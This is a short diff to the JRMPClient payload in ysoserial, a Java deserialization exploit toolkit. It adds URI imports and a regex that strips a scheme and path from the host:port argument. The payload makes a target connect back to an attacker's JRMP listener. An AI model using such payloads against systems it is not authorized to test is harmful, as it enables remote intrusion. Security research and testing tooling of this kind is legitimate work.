@@ -2,6 +2,8 @@ package ysoserial.payloads;
 
 
 import java.lang.reflect.Proxy;
+import java.net.URI;
+import java.net.URISyntaxException;
 import java.rmi.registry.Registry;
 import java.rmi.server.ObjID;
 import java.rmi.server.RemoteObjectInvocationHandler;
@@ -53,7 +55,9 @@ import ysoserial.payloads.util.PayloadRunner;
 @Authors({ Authors.MBECHLER })
 public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry> {
 
-    public Registry getObject ( final String command ) throws Exception {
+    public Registry getObject ( String command ) throws Exception {
+
+        command = command.replaceAll("(^[a-z]+://)|(/[^:]+$)", "");
 
         String host;
         int port;
